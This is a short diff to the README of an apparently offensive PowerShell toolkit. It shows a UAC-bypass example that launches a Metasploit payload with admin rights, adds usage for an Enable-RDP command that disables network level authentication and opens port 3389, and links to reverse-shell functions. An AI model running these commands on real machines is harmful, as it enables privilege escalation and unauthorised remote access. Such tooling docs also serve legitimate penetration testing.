@@ -199,4 +199,9 @@ Invoke-DccwUACBypass -Program "cmd /c start mfs.exe"
 # This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges
 ```
 
+- Enable-RDP is used to enable RDP on a local machine, disable network level authentication, and enable the firewall rule for port 3389.
+- ```powershell
+Enable-RDP
+```
+
 For more information on Start-Listener, Start-Bind, and Invoke-ReversePowerShell see [https://github.com/tobor88/ReversePowerShell](https://github.com/tobor88/ReversePowerShell)
